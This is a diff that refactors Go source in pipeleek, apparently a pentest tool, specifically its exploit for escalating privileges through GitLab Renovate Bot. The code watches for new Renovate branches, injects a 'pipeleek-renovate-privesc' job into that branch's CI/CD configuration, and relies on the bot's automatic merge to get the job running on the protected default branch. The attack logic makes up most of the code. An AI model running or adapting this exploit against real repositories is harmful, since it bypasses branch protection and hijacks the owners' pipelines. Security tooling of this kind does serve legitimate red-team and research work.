@@ -1,9 +1,8 @@
 package renovate
 
 import (
-	"regexp"
-
 	"github.com/CompassSecurity/pipeleek/pkg/gitlab/util"
+	pkgrenovate "github.com/CompassSecurity/pipeleek/pkg/renovate"
 	"github.com/rs/zerolog/log"
 	gogitlab "gitlab.com/gitlab-org/api/client-go"
 	ci "gitlab.com/mitchenielsen/gitlab-ci-go"
@@ -23,7 +22,8 @@ func RunExploit(gitlabUrl, gitlabApiToken, repoName, renovateBranchesRegex strin
 		log.Fatal().Stack().Err(err).Str("repoName", repoName).Msg("Unable to retrieve project information")
 	}
 
-	regex, err := regexp.Compile(renovateBranchesRegex)
+	// Create branch monitor
+	branchMonitor, err := pkgrenovate.NewBranchMonitor(renovateBranchesRegex)
 	if err != nil {
 		log.Fatal().Stack().Err(err).Msg("The provided renovate-branches-regex regex is invalid")
 	}
@@ -41,7 +41,7 @@ func RunExploit(gitlabUrl, gitlabApiToken, repoName, renovateBranchesRegex strin
 	checkDefaultBranchProtections(git, project, projectAccessLevel)
 
 	log.Info().Msg("Monitoring for new Renovate Bot branches to exploit")
-	branch := monitorBranches(git, project, regex)
+	branch := monitorBranches(git, project, branchMonitor)
 	cicd := getBranchCiCdYml(git, project, *branch)
 	log.Info().Str("branch", branch.Name).Msg("Modifying CI/CD configuration")
 	cicd["pipeleek-renovate-privesc"] = ci.JobConfig{
@@ -53,8 +53,8 @@ func RunExploit(gitlabUrl, gitlabApiToken, repoName, renovateBranchesRegex strin
 
 	updateCiCdYml(cicd, git, project, *branch)
 
-	log.Info().Str("branch", branch.Name).Msg("CI/CD configuration updated, check yourself if we won the race!")
-	log.Info().Msg("If Renovate automatically merges the branch, you have successfully exploited the privilege escalation vulnerability and injected a job into the CI/CD pipeline that runs on the default branch")
+	// Log shared exploit instructions
+	pkgrenovate.LogExploitInstructions(branch.Name, project.DefaultBranch)
 	listBranchMRs(git, project, *branch)
 }
 
@@ -100,9 +100,8 @@ func checkDefaultBranchProtections(git *gogitlab.Client, project *gogitlab.Proje
 	log.Info().Str("branch", project.DefaultBranch).Any("currentAccessLevel", currentAccessLevel).Msg("Default branch is protected and you do not have direct access, proceeding with exploit")
 }
 
-func monitorBranches(git *gogitlab.Client, project *gogitlab.Project, regex *regexp.Regexp) *gogitlab.Branch {
-
-	originalBranches := make(map[string]bool)
+func monitorBranches(git *gogitlab.Client, project *gogitlab.Project, branchMonitor *pkgrenovate.BranchMonitor) *gogitlab.Branch {
+	isFirstScan := true
 
 	for {
 		log.Debug().Msg("Checking for new branches created by Renovate Bot")
@@ -115,29 +114,21 @@ func monitorBranches(git *gogitlab.Client, project *gogitlab.Project, regex *reg
 			log.Error().Err(err).Msg("Failed to list branches, retrying ...")
 		}
 
+		if isFirstScan {
+			log.Debug().Msg("Storing original branches for comparison")
+			if len(branches) == 100 {
+				log.Warn().Msg("More than 100 branches found, new branches might not be detected, improve this logic here in a PR thx ;)")
+			}
+		}
+
 		for _, branch := range branches {
-
-			if len(originalBranches) == 0 {
-				log.Debug().Msg("Storing original branches for comparison")
-				for _, b := range branches {
-					originalBranches[b.Name] = true
-				}
-
-				if len(originalBranches) == 100 {
-					log.Warn().Msg("More than 100 branches found, new branches might not be detected, improve this logic here in a PR thx ;)")
-				}
-			}
-
-			if _, exists := originalBranches[branch.Name]; exists {
-				continue
-			}
-
-			log.Info().Str("branch", branch.Name).Msg("Checking if new branch matches Renovate Bot regex")
-			if regex.MatchString(branch.Name) {
-				log.Info().Str("branch", branch.Name).Msg("Identified Renovate Bot branch, starting exploit process")
+			if branchMonitor.CheckBranch(branch.Name, isFirstScan) {
+				log.Info().Str("branch", branch.Name).Msg("Starting exploit process")
 				return branch
 			}
 		}
+
+		isFirstScan = false
 	}
 }
 
